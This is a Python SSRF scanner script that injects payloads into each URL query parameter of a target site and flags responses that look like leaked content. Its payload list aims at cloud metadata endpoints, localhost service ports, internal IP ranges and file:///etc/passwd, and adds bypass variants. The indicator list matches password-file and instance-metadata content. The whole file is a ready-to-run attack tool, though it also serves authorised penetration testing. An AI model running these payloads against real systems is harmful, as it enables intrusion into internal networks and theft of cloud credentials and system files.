#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor

# SSRF Payloads
PAYLOADS = [
    # Localhost
    'http://127.0.0.1',
    'http://localhost',
    'http://127.1',
    'http://127.0.0.1:80',
    'http://127.0.0.1:22',
    'http://127.0.0.1:3306',
    'http://127.0.0.1:6379',
    'http://127.0.0.1:8080',
    'http://127.0.0.1:9200',
    # Cloud Metadata
    'http://169.254.169.254',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/user-data/',
    'http://metadata.google.internal',
    'http://metadata.google.internal/computeMetadata/v1/',
    # File protocol
    'file:///etc/passwd',
    'file:///etc/hosts',
    'file:///c:/windows/win.ini',
    # Internal IPs
    'http://192.168.0.1',
    'http://192.168.1.1',
    'http://10.0.0.1',
    'http://172.16.0.1',
    # DNS Rebinding
    'http://localtest.me',
    'http://spoofed.burpcollaborator.net',
    # Bypass
    'http://[::1]',
    'http://0.0.0.0',
    'http://127.0.0.1.nip.io',
    'http://127.0.0.1.xip.io',
]

SSRF_INDICATORS = [
    'root:x:0:0',
    'root:*:0:0',
    'localhost',
    '127.0.0.1',
    'ami-id',
    'instance-id',
    'computeMetadata',
    'metadata',
    '[fonts]',
    'for 16-bit app support',
    'Windows Registry',
]

def test_payload(url, param, payload):
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        
        r = requests.get(new_url, timeout=5, allow_redirects=False)
        
        # فحص المؤشرات
        for indicator in SSRF_INDICATORS:
            if indicator in r.text:
                return {
                    'param': param,
                    'payload': payload,
                    'url': new_url,
                    'indicator': indicator,
                    'status': 'VULNERABLE'
                }
        
        # فحص إذا الرد طويل (قد يكون محتوى داخلي)
        if len(r.text) > 5000 and 'error' not in r.text.lower():
            return {
                'param': param,
                'payload': payload,
                'url': new_url,
                'indicator': f'Large response ({len(r.text)} bytes)',
                'status': 'POSSIBLE'
            }
    except Exception as e:
        pass
    return None

def scan_ssrf(url):
    print(f"\n{'='*60}")
    print(f"  SSRF Scanner")
    print(f"  Target: {url}")
    print(f"{'='*60}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters found in URL")
        print("[*] Example: https://example.com/fetch?url=test")
        return []
    
    print(f"[*] Found {len(params)} parameter(s): {list(params.keys())}")
    print(f"[*] Testing {len(PAYLOADS)} SSRF payloads...\n")
    
    found = []
    
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = []
        for param in params:
            for payload in PAYLOADS:
                futures.append(ex.submit(test_payload, url, param, payload))
        
        for future in futures:
            result = future.result()
            if result:
                found.append(result)
                print(f"  [!] {result['status']} on '{result['param']}'")
                print(f"      Payload: {result['payload']}")
                print(f"      Indicator: {result['indicator']}")
                print(f"      URL: {result['url'][:100]}\n")
    
    print(f"{'='*60}")
    print(f"  Found: {len(found)} potential SSRF")
    print(f"{'='*60}\n")
    
    return found

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 ssrf_scanner.py <url>")
        print("Example: python3 ssrf_scanner.py 'https://example.com/fetch?url=test'")
        sys.exit(1)
    
    scan_ssrf(sys.argv[1])
